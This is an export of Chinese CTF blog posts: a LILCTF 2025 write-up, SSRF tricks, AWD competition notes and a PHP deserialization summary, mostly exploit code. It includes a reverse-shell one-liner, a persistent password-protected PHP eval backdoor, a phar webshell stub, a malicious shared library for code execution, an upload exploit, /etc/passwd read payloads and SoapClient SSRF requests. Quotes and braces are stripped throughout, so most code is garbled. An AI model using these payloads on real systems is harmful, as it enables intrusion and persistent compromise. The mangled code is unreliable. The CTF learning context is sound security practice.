[{"title":"LILCTF 2025","path":"/2025/08/19/LilCTF2025/","content":"Ekko_note审计源码 大概思路就是:有一个管理员面板 admin才能访问并且要到2066年以后才可以访问 admin通过session伪造 时间api可以修改 注册账号，登录后伪造admin的session进去 python flask_session_cookie_manager3.py encode -s your-secret-key-here -t is_admin: True, user_id: 1, username: admin 在服务器起一个api服务，修改api为服务器的api from flask import Flask, jsonifyapp = Flask(__name__)@app.route(/time)def fake_time(): return jsonify(date:2066-08-15 16:14:34,weekday:星期五,timestamp:1755245674,remark:任何情况请联系QQ:3295320658 微信服务号:顺成网络)if __name__ == __main__: app.run(host=0.0.0.0, port=2333) 修改api后进入面板 直接执行命令没有回显 试反弹shell python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((your_ip,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/sh) ez_bottle在upload上传文件 绕过黑名单 [, , os, eval, exec, sock, , , bul, class, ?, :, bash, _, globals, get, open] 使用了setattr的python函数 setattr(obj, name, value) % import bottle % setattr(bottle, TEMPLATE + chr(95) + PATH, [/]) % include(flag) 大意就是把Bottle 模板引擎在什么目录下搜索模板文件改为了根目录 然后include了flag文件 写脚本上传压缩包，压缩包里面是包含bottle语句的txt文件 import ioimport zipfileimport requestsdef make_zip_payload() - io.BytesIO: txt = % import bottle % setattr(bottle, TEMPLATE + chr(95) + PATH, [/]) % include(flag) buf = io.BytesIO() with zipfile.ZipFile(buf, w, zipfile.ZIP_DEFLATED) as z: z.writestr(exploit, txt) buf.seek(0) return bufdef upload_zip_file(target_url: str): zbuf = make_zip_payload() files = file: (exploit.zip, zbuf, application/zip) print(f[*] 正在上传恶意ZIP文件到 target_url...) try: r = requests.post( target_url, files=files, timeout=20, headers=User-Agent: Mozilla/5.0 ) if r.status_code == 200: print([+] 文件上传成功！) print([*] 服务器响应:, r.text[:300]) else: print(f[!] 上传失败，状态码: r.status_code) print([!] 错误响应:, r.text[:300]) except Exception as e: print(f[!] 上传过程中发生错误: str(e))if __name__ == __main__: TARGET_UPLOAD_URL = http://challenge.xinshi.fun:40967/upload upload_zip_file(TARGET_UPLOAD_URL) print([*] 上传完成 ) 访问上传的文件，得到flag Your Uns3r?phphighlight_file(__FILE__);class User public $username; public $value; public function exec() $ser = unserialize(serialize(unserialize($this-value))); if ($ser != $this-value $ser instanceof Access) include($ser-getToken()); public function __destruct() if ($this-username == admin) $this-exec(); class Access protected $prefix; protected $suffix; public function getToken() if (!is_string($this-prefix) || !is_string($this-suffix)) throw new Exception(Go to HELL!); $result = $this-prefix . lilctf . $this-suffix; if (strpos($result, pearcmd) !== false) throw new Exception(Can I have peachcmd?); return $result; $ser = $_POST[user];if (strpos($ser, admin) !== false strpos($ser, Access:) !== false) exit (no way!!!!);$user = unserialize($ser);throw new Exception(nonono!!!); 这道题出得很好(赞 1.是抛出错误 使用gc回收机制来绕过 这样就可以触发__destruct__魔术方法绕过抛出错误 2.是admin和Acess的绕过 只要不同时出现就好 Acess是类名 使用大小写绕过 3.$result $this-prefix . ‘lilctf’ . $this-suffix 绕过这个lilctf使用..来绕过 4.unserialize(serialize(unserialize($this-value))) value赋值为serialize($b)就行 ?phpclass User public $username=admin; public $value;class Access protected $prefix=php://filter/convert.base64-encode/resource=/; protected $suffix=/../flag;$a = new User();$b = new Access();$a-value = serialize($b);$c=array(a=$a,b=NULL);echo urlencode(serialize($c)); 生成: a%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22value%22%3Bs%3A117%3A%22O%3A6%3A%22Access%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A45%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A8%3A%22%2F..%2Fflag%22%3B%7D%22%3B%7Ds%3A1%3A%22b%22%3BN%3B%7D 把最后的 a:2:s:1:a;O:4:User:2:s:8:username;s:5:admin;s:5:value;s:117:O:6:Access:2:s:9:*prefix;s:45:php://filter/convert.base64-encode/resource=/;s:9:*suffix;s:8:/../flag;;s:1:b;N;改为a:2:s:1:a;O:4:User:2:s:8:username;s:5:admin;s:5:value;s:117:O:6:access:2:s:9:*prefix;s:45:php://filter/convert.base64-encode/resource=/;s:9:*suffix;s:8:/../flag;;s:1:User;N; urlencode即可 php_jail_is_my_cry?phpif (isset($_POST[url])) $url = $_POST[url]; $file_name = basename($url); $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); curl_close($ch); if ($data) file_put_contents(/tmp/.$file_name, $data); echo 文件已下载: a href=?down=$file_name$file_name/a; else echo 下载失败。; if (isset($_GET[down])) include /tmp/ . basename($_GET[down]); exit;// 上传文件if (isset($_FILES[file])) $target_dir = /tmp/; $target_file = $target_dir . basename($_FILES[file][name]); $orig = $_FILES[file][tmp_name]; $ch = curl_init(file://. $orig); // I hide a trick to bypass open_basedir, Im sure you can find it. curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); curl_close($ch); if (stripos($data, ?) === false stripos($data, php) === false stripos($data, halt) === false) file_put_contents($target_file, $data); else echo 存在 `?` 或者 `php` 或者 `halt` 恶意字符!; $data = null; ? 简单的php代码 三个点下载文件 包含文件 上传文件 很明显的不准上传一句话php木马 这里有文件包含很容易联想到使用gz打包的pahr文件来绕过 include可以直接解析gz文件 写一句话木马 https://xz.aliyun.com/news/18584 ?php$phar = new Phar(12.phar);$phar -startBuffering();$stub = STUB?phpfile_put_contents(/var/www/html/.php,?=eval($_POST[1])?);__HALT_COMPILER();? STUB;$phar -setStub($stub);$phar -addFromString(test.txt, test);$phar -stopBuffering();? 生成的phar文件打包成gz gzip 12.phar 源码phpini或者这里的环境都给了disablefunctions 几乎把所有禁完了 提示 ​ I hide a trick to bypass open_basedir, I’m sure you can find it. open_basedir/var/www/html:/tmp/var/www/html:/tmp 使用curl来进行命令rce 该curl命令行工具在类 POSIX 系统（Linux、macOS 等）上存在任意代码执行漏洞。该--engine选项允许从共享库（文件）加载 OpenSSL 加密引擎.so。关键在于，该选项接受库文件的绝对路径或相对路径，从而允许用户加载文件系统上的任何共享库。攻击者可以构造一个包含__attribute__((constructor))函数的恶意共享库。该函数会在库加载到进程内存时由动态加载器执行curl，从而实现立即代码执行，甚至在 OpenSSL 尝试将其初始化为引擎之前。如果攻击者可以影响传递给命令的参数curl，这将导致直接 RCE，这是 Web 应用程序后端、CI/CD 管道和其他自动化脚本中的常见情况。 https://hackerone.com/reports/3293801 通过编译一个.so文件进行读取realflag文件 #include stdlib.h__attribute__((constructor))static void rce_init(void) system(/readflag ./flag.txt); 上传so文件成功后回到原来的木马界面 1=$ch = curl_init(http://www.azureyinglong.cn);curl_setopt($ch, CURLOPT_SSLENGINE , /tmp/sauy.so);$data = curl_exec($ch);curl_close($ch); 我曾有一份工作​","tags":["CTF-wp"]},{"title":"SSRF技巧总结","path":"/2025/08/04/SSRF技巧总结/","content":"·以下 3 种主要方式在 PHP 中检索 URLcurl library (CURL库)用于发起网络请求（HTTP、HTTPS、FTP 等) 可以设置 复杂请求头 GET/POST/PUT 可以支持复杂协议 HTTP/HTTPS/FTP/SMTP file_get_contents (函数)支持 http://、https:// 等 URL（前提是 PHP allow_url_fopen = On） 支持读取敏感本地文件 file_get_contents(file:///etc/passwd); exec()exec(ping . $_GET[ip]); ·容易受攻击的代码situation-1-filter_var()filter_var()PHP 提供的一个函数，用来过滤和验证变量。 filter_var($value, $filter, $options); FILTER_VALIDATE_URLPHP 预定义的过滤器之一 用法:filter_var(‘http://example.com‘, FILTER_VALIDATE_URL); 作用：用来检查字符串是否是一个合法的 URL FILTER_FLAG_QUERY_REQUIRED·类型：PHP 内置过滤器的 标志（flag）。 ·用途：与 FILTER_VALIDATE_URL 搭配使用，要求 URL 必须包含查询字符串。 $url = http://example.com;$result = filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED);var_dump($result); // false，因为没有查询字符串$url = http://example.com/?id=1;$result = filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED);var_dump($result); // string(26) http://example.com/?id=1 攻击面?phpfunction curl($url) $optArray = array( CURLOPT_URL = $url, CURLOPT_FOLLOWLOCATION = 1 ); $ch = curl_init(); curl_setopt_array($ch, $optArray); $response = curl_exec($ch) or die(Error!); curl_close($ch); return $response;$content = curl(filter_var($_GET[url], FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED));echo $content; 攻击方法: file:/etc/passwd?/ file:/etc%252Fpasswd?/ 读取flagfile:/flag? situation-2- file_get_contents()?php$f = filter_var($_GET[url], FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED) or die(Error!);echo file_get_contents($f); POC: file:///etc/?/../passwd 解释:将其用作目录文件夹名称时，“?” 的使用使其通过验证。然后，我们需要使用“..”技巧来返回到“etc”。 读取flag file:///etc/?/../../flag situation-3?php$url = filter_var($_GET[url], FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED);exec(curl -L . $url, $content) or die(Error!);print_r($content); POC： file:/etc/passwd?/ file:$br/et$uc/pas$teswd?/ 读取flag也是一样的: file:/flag?/ file:$br/fl$teag?/ 解释:因为$x（其中x可以是任何常规字符或字符串）在 Bash 中用于替换变量，该变量必须不存在，否则会在执行的命令中被丢弃。$(x)也可以使用。 汇总pocfile:/etc/passwd?/file:/etc/passwd%3F/file:/etc%252Fpasswd/file:/etc%252Fpasswd%3F/file:///etc/?/../passwdfile:///etc/%3F/../passwdfile:$br/et$uc/pas$teswd?/file:$(br)/et$(u)c/pas$(te)swd?/file:$br/et$uc%252Fpas$teswd?/file:$(br)/et$(u)c%252Fpas$(te)swd?/file:$br/et$uc%252Fpas$teswd%3F/file:$(br)/et$(u)c%252Fpas$(te)swd%3F/file:///etc/passwd?/../passwd","tags":["CTF学习"]},{"title":"AWD笔记","path":"/2025/08/03/AWD记录/","content":"AWD记录改linux密码passwd 输入新密码即可 有权限删除用户userdel -r [用户名] 改mysql密码update mysql.user set passwordpassword(‘密码’) where user’root’; 1. 登录 mysql 终端，运行：mysql set password=password(new password);mysqlflush privileges;2. 修改 mysql user 表mysqluse mysql;mysqlupdate user set password=password(new password) where user=root;mysqlflush privileges;3. 使用 GRANT 语句mysqlGRANT ALL PRIVILEGES ON *.* TO root@127.0.0.1 IDENTIFIED BY new password WITH GRANT OPTION;mysqlflush privileges;4. mysqladmin[root@ubuntu]# mysqladmin -u root password new password;（注意双引号或不加） 删除匿名用户delete from mysql.user where user’ ‘; 刷新配置flush privileges; 改网站后台密码从网站页面或者源码或者御剑工具找到后台页面，然后尝试弱口令登入后改管理员密码。 网站目录打包成cd varwwwhtml tar -cvf [打包后的文件名.tar] * zip -r 输出文件名.zip 目录名 将压缩包解压，然后拉到D盾里面扫描木马文件 查看最近修改的文件ls -ltR | head -n 10 查看进程who 杀死进程pkill -kill -t pts进程号 ffuf扫描存活的端口ffud -u url.FUZZ.url number.txt 登录mysql1.navicat mysql默认端口3306 可能不允许外部连接 2.服务器里登录 mysql -u [username] -p 不死马sauy.php ?phpignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = ./.index.php;$code = ?php if(md5($_POST[pass])==02db7748bedfcd5dafc502d63228f455)@eval($_POST[a]); ?;while (1)\tfile_put_contents($file,$code);\tusleep(5000);//hacked by sauy? passRimuru20250802 马儿用法：fuckyou.php?passRimuru20250802acommand 杀不死马杀死不死马的方法，查看不死马的进程ID： # top | grep httpd chmod 777 kill.sh nohup .kill.sh 查到ID为 11198 ，根据ID号和webshell名写.sh脚本。 # vim kill.sh #!/bin/bashwhile truedo kill -9 11198 2/dev/null rm -f .shell.phpdone 调取自己的webshell不断交flagimport requeststoken = nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]targets = [fhttp://192-168-1-i.pvp6258.bugku.cn/.sauy.php for i in nums]for url in targets: try: print(f[+] Checking url) resp = requests.post(url, data=cmd: cat /flag, timeout=3) flag = resp.text.strip() if flag in flag: # 简单判断 print(f[+] Got flag from url: flag) submit_url = fhttps://ctf.bugku.com/pvp/submit.html?token=tokenflag=flag r = requests.get(submit_url) print(f[+] Submit response: r.text) else: print(f[-] No flag at url) except requests.RequestException as e: print(f[-] url Failed: e) ffuf扫描存活网口ffuf -u http://192-168-1-FUZZ.pvp6258.bugku.cn -w number.txt -mc 200,403","tags":["AWD"]},{"title":"PHP反序列化总结","path":"/2025/08/01/php反序列化总结/","content":"必知知识protected 和 privateprivate:变量名前加”%00[类名]%00” ?phpclass test private $pub=benben; function jineng() echo $this-pub; $a = new test();echo serialize($a);?O:4:test:1:s:9:testpub;s:6:benben; protected:变量名前加”%00*%00” ?phpclass test protected $pub=benben; function jineng() echo $this-pub; $a = new test();echo serialize($a);?O:4:test:1:s:6:*pub;s:6:benben; 魔术方法__construct() //当对象被创建时，会触发进行初始化__destruct() //对象被销毁时触发__sleep() //serialize()函数会先检查类是否存在有一个魔术方法__sleep()。如果存在，该方法会被先调用，然后再执行序列化操作。__wakeup() //unserialize之前会检查是否存在一个__wakeup函数 如果存在 就会先调用这个方法 然后再反序列化 //执行之前__toString()： //当一个对象被当作字符串使用时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //获得一个类的成员变量时调用,用于从不可访问的属性读取数据（不可访问的属性包括：1.属性是私有型。2.类中不存在的成员变量）__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试以调用函数的方式调用一个对象时 绕过__wakeup()当成员属性数目大于实际数目O:4:Name:2:s:8:username;s:5:admin;s:8:password;i:100;改成O:4:Name:3:s:8:username;s:5:admin;s:8:password;i:100; 意思是把两个变量指向同一内存地址,这样当对其中一个变量进行操作时，另一个也会随之变化。不仅可以应用于绕过__wakeup(),其实更常用在为了满足特定条件而使用。 EX:下题就利用了，但是实际执行了wakeup，只是通过的特性让其满足if的条件。 ?phphighlight_file(__FILE__);class ctf public $key; public function __destruct() echo destructbr; $this-key=False; if(!isset($this-wakeup)||!$this-wakeup) echo You get it!; public function __wakeup() echo wakeupbr; $this-wakeup=True; unserialize($_GET[ctf]);/**$a = new ctf();$a-key = $a-wakeup;echo serialize($a);序列化数据:O:3:ctf:2:s:3:key;N;s:6:wakeup;R:2;**/ 使用C绕过序列化数据把第一个O改成C即可，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容，不过可以使用原生类打包的方式来绕过，也是绕过^[Oa]:[d]+过滤的方法之一。 [LitCTF 2025]君の名は就考了绕过^[Oa]:[d]+过滤，使用原生类打包。 以C开头的原生类 [如果要使用原生类打包的话，运行链子建议在较低版本运行，我使用的是5.xx,因为高版本php序列化出来的数据不是C开头，而是O] ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize PHP GC回收机制GC的全称是Garbage Collection也就是垃圾回收的意思在PHP中，是使用引用计数和回收周期来自动管理内存对象的，当一个对象被设置为NULL，或者没有任何指针指向时，他就会变成垃圾，被GC机制回收掉，这里其实就可以理解为当一个对象没有被引用时，也就是基本类型(字符串，整形等等），被引用也就是一个对象(Object），在这可以理解为一个对象没有被引用时就会被GC机制回收 当我们PHP创建一个变量时，这个变量会被存储在一个名为zval的变量容器中。在这个zval变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。 第一个字节名为is_ref，是bool值，它用来标识这个变量是否是属于引用集合。PHP引擎通过这个字节来区分普通变量和引用变量，由于PHP允许用户使用来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。 第二个字节是refcount，它用来表示指向zval变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用。 ?php$a=Sauy;xdebug_debug_zval(a);? 输出: a:(refcount=1, is_ref=0)string Sauy (length=4) 有一个变量a,且未被引用故为false 变量容器在refcount变成0时就被销毁。它这个值是如何减少的呢，当函数执行结束或者对变量调用了unset()函数,refcount就会减1。 php反序列化的引用GC如果在PHP反序列化中生效，那它就会直接触发_destruct方法 unset处理的情况?phphighlight_file(__FILE__);error_reporting(0);class test public $num; public function __construct($num) $this-num = $num; echo $this-num.__construct./br; public function __destruct() echo $this-num.__destruct()./br; $a = new test(1);$b = new test(2);$c = new test(3);/*1__construct2__construct3__construct3__destruct()2__destruct()1__destruct()*/ 但是当我我们加上unset时 ?phphighlight_file(__FILE__);error_reporting(0);class test public $num; public function __construct($num) $this-num = $num; echo $this-num.__construct./br; public function __destruct() echo $this-num.__destruct()./br; $a = new test(1);unset($a);$b = new test(2);$c = new test(3);/*1__construct1__destruct()2__construct3__construct3__destruct()2__destruct()*/ 发现destruct被提前触发 当对象为**NULL**时?phphighlight_file(__FILE__);$flag = flagtest_flag;class B function __destruct() global $flag; echo $flag; $a = unserialize($_GET[ctf]);throw new Exception(nonono); 这段代码正常情况下因为抛出异常无法触发destruct，这个时候就需要gc机制来触发 ?phphighlight_file(__FILE__);class B function __destruct() global $flag; echo $flag; $a=array(a=new B,b=NULL);echo serialize($a);//a:2:s:1:a;O:1:B:0:s:1:b;N; 把b改为a就可以绕过 即在反序列化时，会下先让a赋值为类B，之后再将a赋值为NULL，但一开始a已经是对象了，赋值为NULL时就会出现对象为NULL的情况，从而触发__destruct a:2:{s:1:”a”;O:1:”B”:0:{}s:1:”a”;N;} 这种方法也是php序列化常用的trick phar序列化的应用方法类似于php反序列化 不过phar文件是需要签名 生成了一般的phar文件不能010直接改需要脚本改 例题:prize_p1 | NSSCTF wp:[关于gc回收机制在phar序列化的一次例题](https://sauy.top/2025/07/22/NSSCTF prize_p1) 字符串逃逸原理Q：为何要进行字符串逃逸？ 当我们通过pop或者其他方式不可以修改目标的值时，可以通过控制可控变量来进行修改目标的值，从而达成攻击。 ?phpfunction waf($str) return str_replace(bad,good,$str);class GetFlag public $key; public $cmd = whoami; public function __construct($key) $this-key = $key; public function __destruct() system($this-cmd); unserialize(waf(serialize(new GetFlag($_GET[key])))); 如果本题我们传入keybadbad： O:7:GetFlag:2:s:3:key;s:6:badbad;s:3:cmd;s:6:whoami; 但是由于str_place 会将bad替换为good，变为： O:7:GetFlag:2:s:3:key;s:6:goodgood;s:3:cmd;s:6:whoami; s:6:goodgood; 这样写是错误的 php只能解析到’goodgo‘ 多出的od就会被丢弃 但是这里由于传入格式错误 所以不可行 我们可以考虑用这种原理，来构造合法的字符串修改cmd的值。 我们想构造： O:7:GetFlag:2:s:3:key;s:N:N个长度的字符串;s:3:cmd;s:2:ls;;s:3:cmd;s:6:whoami;key=N个长度的字符串;s:3:cmd;s:2:ls;;s:3:cmd;s:2:ls; 就是我们想要逃逸出去的字符，我们希望N个长度的字符串的长度恰好到双引号之前，此时我们的输入就会作为合法的序列化数据进行处理，后续原本的 “;s:3:”cmd”;s:6:”whoami”;} 就会被丢弃。 我们需要插入的字符总共有22位，因此需要逃逸出22个字符，一个bad可以逃逸出1个字符，因此需要22个bad，构造Exp如下： ?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad;s:3:cmd;s:2:ls;变为：O:7:GetFlag:2:s:3:key;s:88:goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood;s:3:cmd;s:2:ls;;s:3:cmd;s:6:whoami; 最后的”;s:3:”cmd”;s:6:”whoami”;}就会被抛弃 成功修改了cmd的值 最后要读flag我们需要构造 ;s:3:cmd;s:9:cat /flag; 一共29个 那么需要29个bad变为good ?keybadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad”;s:3:”cmd”;s:9:”cat flag”;} 字符串增多原理：通过闭合来修改我们想要修改属性的值 [NepCTF2024]PHP_MASTER!! 源码: ?phphighlight_file( __FILE__);error_reporting(0);function substrstr($data) $start = mb_strpos($data, [); $end = mb_strpos($data, ]); return mb_substr($data, $start + 1, $end - 1 - $start);class A public $key; public function readflag() if($this-key=== \\0key\\0) $a = $_POST[1]; $contents = file_get_contents($a); file_put_contents($a, $contents); class B public $b; public function __tostring() if(preg_match(/\\[|\\]/i, $_GET[nep])) die(NONONO!!!); $str = substrstr($_GET[nep1].[welcome to. $_GET[nep].CTF]); echo $str; if ($str===NepCTF]) return ($this-b) (); class C public $s; public $str; public function __construct($s) $this-s = $s; public function __destruct() echo $this -str; $ser = serialize(new C($_GET[c]));$data = str_ireplace(\\0,00,$ser);unserialize($data);O:1:C:2:s:1:s;s:1:a;s:3:str;O:1:B:1:s:1:b;N; s后面的部分：;s:3:str;O:1:B:1:s:1:b;N;这就是我们需要逃逸的部分，一个%00可以逃逸一个字符，而我们需要逃逸35个字符，就需要35个%00 c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00;s:3:str;O:1:B:1:s:1:b;N; 这样就可以到B类的__tostring()方法了。 同样的，我们还需要让B类的$b变成phpinfo： “;s:3:”str”;O:1:”B”:1:{s:1:”b”;s:7:”phpinfo”;}} 一共47个字符，那么我们就需要47个%00 c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00;s:3:str;O:1:B:1:s:1:b;s:7:phpinfo; 总payload： c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00;s:3:str;O:1:B:1:s:1:b;s:7:phpinfo;nep1=%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0nep=NepCTNep 字符串减少（较难）原理：是逃逸出一个新的属性 Phar反序列化PHAR是类似于java里的jar包 联系：文件包含里 phar伪协议可以直接读取.phar文件 漏洞原理：使用phar伪协议解析文件的时 ，会自动触发对manifest字段的序列化字符串进行反序列化 phar需要php5.2 其他的看题 ?phphighlight_file(__FILE__);error_reporting(0);class Testobj var $output=echo ok;; function __destruct() eval($this-output); if(isset($_GET[filename])) $filename=$_GET[filename]; var_dump(file_exists($filename));? 利用phar伪协议去读取.phar文件然后再进行执行命令 例题：[NSSRound#4 SWPU]1zweb php -d phar.readonly=0 D:\\ctf\\WEB\\test\\test.php查看index.php 和 upload.php 不难就是利用eval phar反序列化 主要讲payload1和paylaod2payload1:生成要被反序列化的phar文件?phpclass LoveNss public $ljt; public $dky; public $cmd; public function __construct() $this-ljt=Misc; $this-dky=Re; $this-cmd=system(cat /flag);; $phar = new Phar(sauy.phar);$phar-startBuffering();$phar-setStub(GIF89a.?php __HALT_COMPILER(); ? );$a = new LoveNss();$$phar-setMetadata($$a);$phar-addFromString(test.txt, test);$phar-stopBuffering();? payload2：主要是为了绕过wakeup函数 我们就需要修改成员属性 这里签名就会失效 所以需要重新签名 最重要的点就是签名算法要用sha256 而不是网上写的sha1import gzipfrom hashlib import sha256with open(sauy.phar, rb) as file: f = file.read()s = f[:-28] # 获取要签名的数据s = s.replace(b3:, b4:)#更换属性值，绕过__wakeuph = f[-8:] # 获取签名类型以及GBMB标识newf = s + sha256(s).digest() + h # 数据 + 签名 + (类型 + GBMB)#print(newf)newf = gzip.compress(newf) #对Phar文件进行gzip压缩with open(sauy122.png, wb) as file:#更改文件后缀 file.write(newf)//然后就是上传 sauy122.png文件 使用phar协议来读取文件达到phar反序列化的目的上传成功 post传入：file=phar://./upload/sauy122.png 原生类C开头ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize 绕MD5SHA1 XSS使用ErrorException内置类 这两个类使用方法一样的 适用于php7版本在开启报错的情况下（这个默认都是开启的） Error中也有个__toString()，可以控制它的内容实现字符串的输出。 XSS?phphighlight_file(__FILE__);echo unserialize($_GET[ctf])O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A34%3A%22%3Cscript%3Ealert%28%27xss+test%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A27%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Caaa.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D MD5SHA1 会以字符串的形式输出当前的错误信息，包含当前的错误信息（”payload”）还有当前报错的行号（”2”） 那么如果两个同样的类在同一行，那么它的返回值一定是一样的，只要咱们传递的第二个参数不同的话，就可以实现绕过了。 ?php$a = new Error(null, 1);$b = new Error(null, 2);echo $a.br.$b;? 输出 Error: null in D:\\phpstudy_pro\\WWW\\aaa.php:2 Stack trace: #0 mainError: null in D:\\phpstudy_pro\\WWW\\aaa.php:2 Stack trace: #0 main [2020 Geek Challenge GreatPHP] ?phperror_reporting(0);class SYCLOVER public $syc; public $lover; public function __wakeup() if( ($this-syc != $this-lover) (md5($this-syc) === md5($this-lover)) (sha1($this-syc)=== sha1($this-lover)) ) if(!preg_match(/\\\\?php|\\(|\\)|\\|\\/, $this-syc, $match)) eval($this-syc); else die(Try Hard !!); if (isset($_GET[great])) unserialize($_GET[great]); else highlight_file(__FILE__);??phpclass SYCLOVER public $syc; public $lover; public function __wakeup() if( ($this-syc != $this-lover) (md5($this-syc) === md5($this-lover)) (sha1($this-syc)=== sha1($this-lover)) ) if(!preg_match(/\\\\?php|\\(|\\)|\\|\\/, $this-syc, $match)) eval($this-syc); else die(Try Hard !!); $str = ??=include~.urldecode(%D0%99%93%9E%98).?;/*或使用[~(取反)][!%FF]的形式，即: $str = ??=include[~.urldecode(%D0%99%93%9E%98).][!.urldecode(%FF).]?; $str = ??=include $_GET[_]?;*/$a=new Exception($str,1);$b=new Exception($str,2);$c = new SYCLOVER();$c-syc = $a;$c-lover = $b;echo(urlencode(serialize($c)));? 文件操作遍历文件DirectoryIterator FilesystemIterator GlobIterator 配合glob:遍历文件,可以搭配伪协议使用。 DirectoryIterator与glob:协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件 读文件SplFileObject类 ?php$context = new SplFileObject(/etc/passwd);foreach($context as $f) echo($f); SSRFSoapClient 类 该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。 构造函数为: public SoapClient :: SoapClient(mixed $wsdl [，array $options ]) ·第一个参数是用来指明是否是 wsdl 模式，将该值设为 null 则表示非 wsdl 模式。 ·第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。 使用前提:1.需要有soap扩展，且不是默认开启，需要手动开启2.需要调用一个不存在的方法触发其__call()函数3.仅限于http/https协议 使用示例:?php$a = new SoapClient(null,array(location=http://47.xxx.xxx.72:2333/aaa, uri=http://47.xxx.xxx.72:2333));$b = serialize($a);echo $b;$c = unserialize($b);$c-a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf? SSRF + CRLF 配合使用SoapClient反序列化+CRLF 可以生成任意POST请求 EX1： ?php$target = http://47.xxx.xxx.72:2333/;$post_data = data=whoami;$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93);$a = new SoapClient(null,array(location = $target,user_agent=wupco^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: . (string)strlen($post_data).^^^^.$post_data,uri=test));$b = serialize($a);$b = str_replace(^^, \\r,$b);echo $b;$c = unserialize($b);$c-a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf? EX2： ?php$target = http://127.0.0.1/flag.php;// 填入post的数据 $post_string = a=file_put_contents(shell.php, ?php phpinfo();?);;// 填入你想要的http头$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: aaaa=ssss);$user_agent = aaa^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string;$options = array( location = $target, user_agent= $user_agent, uri= aaab);$b = new SoapClient(null, $options);$aaa = serialize($b);$aaa = str_replace(^^, %0d%0a, $aaa);$aaa = str_replace(, %26, $aaa);echo $aaa;? XXESimpleXMLElement类 可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程 xml 文件的载入。第二个参数的常量值我们设置为 2 即可。第一个参数 data 就是我们自己设置的 payload 的 url 地址，即用于引入的外部实体的 url。 这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。 [SUCTF 2018]Homework Trick过滤属性名称用大写的S后跟的名称，php会当成16进制解析 